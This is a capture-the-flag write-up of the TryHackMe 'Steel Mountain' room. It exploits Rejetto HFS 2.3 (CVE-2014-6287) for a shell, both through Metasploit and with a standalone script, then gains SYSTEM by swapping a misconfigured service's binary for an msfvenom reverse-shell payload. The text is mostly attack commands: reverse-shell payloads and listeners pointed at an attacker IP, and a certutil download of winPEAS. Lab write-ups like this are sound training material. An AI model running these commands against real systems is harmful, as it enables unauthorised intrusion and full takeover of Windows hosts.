# Steel Mountain – TryHackMe Writeup

## Objective
Gain initial access to a vulnerable Windows machine using a web exploit, then perform privilege escalation using PowerShell enumeration and service misconfigurations to obtain Administrator access.

---

# Reconnaissance

## Check host
```bash
ping -c 5 <target-ip>
```

## Port scan
```bash
nmap -sC -sV -p- <target-ip>
```

### Key findings
- Port 8080 → Web Server
- HttpFileServer (HFS) 2.3

This version is vulnerable to:
```
CVE-2014-6287 (Remote Code Execution)
```

---

# Initial Access (Metasploit)

## Start Metasploit
```bash
msfconsole
search rejetto
use windows/http/rejetto_hfs_exec
```

## Configure
```bash
set RHOSTS <target-ip>
set RPORT 8080
set LHOST <attacker-ip>
run
```

Meterpreter session opened.

---

## Enumeration

```bash
sysinfo
getuid
```

User:
```
bill
```

Retrieve user flag:
```bash
cd C:\Users\bill\Desktop
type user.txt
```

---

# Privilege Escalation (PowerUp)

## Upload PowerUp
```bash
upload PowerUp.ps1
```

Load PowerShell:
```bash
load powershell
powershell_shell
. .\PowerUp.ps1
Invoke-AllChecks
```

---

## Finding

PowerUp detected:

```
AdvancedSystemCareService9
- CanRestart: True
- Unquoted Service Path
- Writable directory
```

This allows service binary replacement.

---

## Create payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4443 -f exe-service -o ASCService.exe
```

---

## Replace service binary

```bash
sc stop AdvancedSystemCareService9
upload ASCService.exe
```

---

## Listener
```bash
use multi/handler
set payload windows/shell_reverse_tcp
set LHOST <attacker-ip>
set LPORT 4443
run
```

Restart service:
```bash
sc start AdvancedSystemCareService9
```

SYSTEM shell obtained.

---

## Root flag
```bash
cd C:\Users\Administrator\Desktop
type root.txt
```

---

# Manual Exploitation (Without Metasploit)

## Download exploit
```
CVE-2014-6287 – Rejetto HFS RCE
```

### Setup
Terminal 1:
```bash
python3 -m http.server 80
```

Terminal 2:
```bash
nc -nvlp 443
```

Terminal 3:
```bash
python2 39161.py <target-ip> 8080
```

Shell received.

---

## Enumeration with winPEAS

Transfer:
```bash
certutil -urlcache -f http://<attacker-ip>/winPEASx64.exe winpeas.exe
```

Run:
```bash
.\winpeas.exe
```

Same vulnerable service discovered → repeat service replacement technique → SYSTEM.

---

# Tools Used

- Nmap
- Metasploit
- PowerUp
- winPEAS
- msfvenom
- Netcat
- Certutil

---

# Attack Flow Summary

1. Nmap scanning  
2. Identify HFS 2.3  
3. Exploit CVE-2014-6287  
4. Gain low-privilege shell  
5. PowerUp enumeration  
6. Service misconfiguration found  
7. Replace service binary  
8. Restart service → SYSTEM  

---

# Techniques Practiced

- Web RCE exploitation  
- Meterpreter usage  
- Windows enumeration  
- PowerShell privilege escalation  
- Service binary hijacking  
- Reverse shells  
- Manual exploitation  

---

✅ Room completed successfully
